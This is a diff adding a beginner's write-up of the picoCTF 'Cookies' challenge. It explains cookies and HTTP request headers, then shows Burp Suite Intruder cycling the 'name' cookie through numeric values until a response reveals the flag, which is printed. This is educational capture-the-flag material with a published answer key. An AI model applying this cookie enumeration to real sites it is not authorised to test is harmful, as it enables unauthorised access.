@@ -1,5 +1,109 @@
 Description
 Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:17781/
 
-We inspect the page and used burpsuite to i'll get back o it
+Here we explored the search baar
+we inspects the website.
+Inspect element is a feature of modern web browsers that enables anyone to view and edit a website's source code, including its HTML, CSS, JavaScript, and media files.
+When the source code is modified with the inspect tool, the changes are shown live inside the browser window.
+
+what is cookies?
+Cookies are small files of information that a web server generates and sends to a web browser.
+Web browsers store the cookies they receive for a predetermined period of time, or for the length of a user's session on a website.
+
+we change the value of name
+
+# HTTP REQUEST SENT TO THE SERVER (WHEN WE SEARCH FOR SOMETHING). 
+    GET /check HTTP/1.1  
+    Host: mercury.picoctf.net:17781
+    Cache-Control: max-age=0
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Referer: http://mercury.picoctf.net:17781/
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: en-US,en;q=0.9
+    Cookie: name=0
+    Connection: close
+
+- GET: This is the HTTP method being used. GET requests are used to retrieve information from a server.
+- /check: This is the path or resource being requested on the server. In this case, it's specifically requesting something called "check".
+- HTTP/1.1: This specifies the version of the HTTP protocol being used. HTTP/1.1 is a common version used for web communication.
+- Host: This line specifies the hostname and port of the server being contacted. Here, it's mercury.picoctf.net on port 17781.
+- Cache-Control: This header tells the server to not use any cached data for this request and retrieve fresh information.
+- Upgrade-Insecure-Requests: This header indicates that the browser prefers to use a secure connection (HTTPS) if available.
+- User-Agent: This header identifies the software making the request. Here, it shows it's a Chrome browser on Windows 10.
+- Accept: This header specifies the types of content the browser can understand. It lists various formats like HTML, images, etc.
+- Referer: This header tells the server the previous web page that linked to this request. Here, it refers to the same server itself.
+- Accept-Encoding: This header specifies the compression formats the browser can handle for the response, allowing for a smaller download size.
+- Accept-Language: This header indicates the preferred languages for the response content. Here, it prioritizes English (US).
+- Cookie: This header sends a cookie named "name" with a value of "0" to the server. Cookies are used to store small pieces of information on the client-side.
+- Connection: This header specifies that this connection should be closed after the response is received.
+
+We use Bupsuite to get all the responds to different values of name.
+
+open Burpsuite
+proxy>intercept> turn on intercept and open browser than search the website given 
+than turn off the intercept
+Then go to target>site map
+click on the url /check
+send the request to the intruder to perform an attack 
+intruder> specify the location where you want to change the value and check for the response
+
+GET /check HTTP/1.1
+Host: mercury.picoctf.net:17781
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://mercury.picoctf.net:17781/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: name=§10§
+Connection: close
+
+then go to payload> payload type = number 
+change from : -1
+        to : 30 // you take more than 30 too i m just taking 30
+start the attack 
+check for all odd lengths along with the response got you will find the flag in the response
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 1184
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Cookies</title>
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <nav>
+                <ul class="nav nav-pills pull-right">
+                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
+                    </li>
+                </ul>
+            </nav>
+            <h3 class="text-muted">Cookies</h3>
+        </div>
+        <div class="jumbotron">
+            <p class="lead"></p>
+            <p style="text-align:center; font-size:30px;">
+                  <b>Flag</b>: 
+                      <code>
+                      picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}
+                      </code>
+            </p>
+        </div>
+        <footer class="footer">
+            <p>&copy; PicoCTF</p>
+        </footer>
+    </div>
+</body>
+</html>
+
 flag:picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}
